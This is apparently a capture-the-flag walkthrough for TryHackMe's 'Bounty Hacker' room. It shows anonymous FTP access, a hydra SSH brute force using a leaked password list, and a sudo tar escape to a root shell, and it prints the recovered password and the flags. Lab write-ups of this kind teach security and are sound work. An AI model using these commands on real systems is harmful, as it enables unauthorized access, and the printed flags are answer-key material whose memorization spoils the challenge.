# Bounty Hacker

[Link to room](https://tryhackme.com/room/cowboyhacker)

## Task 1 Living up to the title.

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

### 1. Deploy the machine.

> No answer needed.

### 2. Find open ports on the machine.

As usual, let's enumerate the machine. Start by visiting the IP address of the machine. We can see that there's not much useful information on the website.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/0bd6b697-b884-4a2a-8293-aed36fadc6fe)

Let's check the page source.

``` 
<html>

<style>
h3 {text-align: center;}
p {text-align: center;}
.img-container {text-align: center;}
</style>

<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>

<body>
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>

<hr>

<h3>Faye:"..hmph.."</h3>

</body>
</html>

```
Nothing much can be found.

Let's do a Nmap scan.
`nmap -sC -sV <Machine's IP address>`

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 02:30 EDT
Nmap scan report for 10.10.139.84
Host is up (0.20s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.66.227
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.55 seconds 
```

> No answer needed.

### 3. Who wrote the task list? 

From the information enumerated in the previous steps, we can see that there is a FTP port opened, which allows Anonymous FTP login. Let's login to the FTP server.
`FTP <Machine's IP address>`

```
Connected to 10.10.139.84.
220 (vsFTPd 3.0.3)
Name (10.10.139.84:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -all
229 Entering Extended Passive Mode (|||46411|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

We can see that there are two important files. Let's go ahead and download the two files to our local machine for further inspection.

```
ftp> get task.txt
local: task.txt remote: task.txt
229 Entering Extended Passive Mode (|||20410|)
ftp: Can't connect to `10.10.139.84:20410': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************************************************************************************************************************************************************|    68        1.00 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.25 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************************************************************************************************************************************************************|   418        5.18 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.48 KiB/s)
```

Now let's check the content of `task.txt`.
`cat task.txt`

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```

The answer for this question is shown. 

>lin

### 4. What service can you bruteforce with the text file found?

We found another open port earlier, which is the SSH port.

>SSH

### 5. What is the users password? 

Remember we downloaded another file from the FTP server earlier? Let's check the content of the file.
`cat locks.txt`

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```

This seems to be a password list. Let's use `hydra` to bruteforce the SSH server. Let's set `lin` as the username, and use the `locks.txt` as the password list.
`hydra -l lin -P locks.txt <Machine's IP address> ssh -V`

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/95032a7b-27a9-4913-85c9-48373e54a492)

Boom! We got the password for the SSH server.

>RedDr4gonSynd1cat3

### 5. user.txt

With the SSH server credentials obtained earlier, let's log in to the SSH server.
`ssh lin@<Machine's IP address> -p 22`

```
The authenticity of host '10.10.139.84 (10.10.139.84)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.139.84' (ED25519) to the list of known hosts.
lin@10.10.139.84's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
```

Now let's try to list out the files available.
`ls -all`

```
total 12
drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt

```

Let's check the content of the `user.txt` for the answer to this question.
`cat user.txt`

```
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

>THM{CR1M3_SyNd1C4T3}

### 6. root.txt

Let's try to change the directory to the root of this machine.

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/792df3ef-e8ca-4e99-884e-ff0b65614880)
![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/c2696910-a4d2-4eb3-9276-da2f5bced179)

The root flag should be located in the `root` directory. Let's try and see if we can access it with `lin`'s account.
`cd root`

```
lin@bountyhacker:/$ cd root
-bash: cd: root: Permission denied
```

Obviously, we can't. The next thing to do here is to check what `lin`'s account can perform in this server.
`sudo -l`

```
lin@bountyhacker:/$ cd root
-bash: cd: root: Permission denied
lin@bountyhacker:/$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

We can see that `lin` can perform `/bin/tar` as root, but how does that help us? Well, we will check in the [GTFObins](https://gtfobins.github.io/).

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/e057369f-b9d8-4f00-8091-4c24268587e7)

Great! Seems like we can break out from restricted environments by spawning an interactive system shell. 
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

![image](https://github.com/ivanloh1216/TryHackMe/assets/58873811/d6b443cf-1d60-46b6-a4cb-a3d7c71f6147)

We have the root account's shell now. Let's get the flag.

```
# ls 
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}

```

>THM{80UN7Y_h4cK3r}
